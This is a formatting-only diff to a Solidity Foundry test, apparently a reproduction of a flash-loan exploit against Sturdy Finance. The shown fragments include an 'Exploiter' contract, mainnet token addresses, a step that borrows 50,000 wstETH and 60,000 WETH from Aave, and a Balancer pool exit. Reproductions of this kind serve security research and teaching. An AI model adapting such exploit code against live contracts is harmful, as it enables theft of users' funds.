@@ -20,14 +20,19 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IwstETH is IERC20 {
+
     function unwrap(uint256 _wstETHAmount) external returns (uint256);
+
 }
 
 interface IMetaStablePool is IERC20 {
+
     function getPoolId() external view returns (bytes32);
+
 }
 
 interface LendingPool {
+
     function borrow(
         address asset,
         uint256 amount,
@@ -57,15 +62,19 @@ interface LendingPool {
     ) external;
 
     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
+
 }
 
 interface ILPVault {
+
     function depositCollateralFrom(address _asset, uint256 _amount, address _user) external payable;
 
     function withdrawCollateral(address _asset, uint256 _amount, uint256 _slippage, address _to) external;
+
 }
 
 interface IBalancerQueries {
+
     function queryJoin(
         bytes32 poolId,
         address sender,
@@ -79,13 +88,17 @@ interface IBalancerQueries {
         address recipient,
         IBalancerVault.ExitPoolRequest memory request
     ) external returns (uint256 bptIn, uint256[] memory amountsOut);
+
 }
 
 interface ISturdyOracle {
+
     function getAssetPrice(address asset) external view returns (uint256);
+
 }
 
 contract ContractTest is Test {
+
     WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IwstETH wstETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
     IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
@@ -125,7 +138,7 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 50_000 * 1e18;
         amounts[1] = 60_000 * 1e18;
-        uint256[] memory modes = new uint[](2);
+        uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
         console.log("1. Borrow 50,000 wstETH and 60,000 WETH from Aave as a flashloan.");
@@ -172,9 +185,11 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
 
 contract Exploiter is Test {
+
     address owner;
     uint256 nonce;
     WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
@@ -326,4 +341,5 @@ contract Exploiter is Test {
         );
         Balancer.exitPool(poolId, address(this), payable(address(this)), request);
     }
+
 }
